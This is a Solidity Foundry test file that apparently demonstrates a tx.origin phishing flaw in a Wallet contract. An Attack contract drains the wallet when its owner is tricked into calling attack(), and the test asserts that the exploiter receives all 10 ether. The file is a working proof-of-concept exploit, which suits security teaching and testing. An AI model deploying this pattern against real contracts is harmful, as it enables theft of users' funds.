// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Wallet.sol";

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}

contract WalletTest is Test {
    uint256 public privateKey = 1234;
    address public signer;
    Wallet public wallet;
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.deal(signer, 10 ether);
        vm.startPrank(signer);
        wallet = new Wallet{value: 10 ether}();
        vm.stopPrank();
    }

    function test_trick_to_sign_tx() public {
        vm.startPrank(exploiter);
        Attack attack = new Attack(wallet);
        vm.stopPrank();
        assertEq(wallet.owner(), signer);
        vm.startPrank(signer,signer);
        attack.attack();
        assertEq(exploiter.balance, 10 ether);
    }
}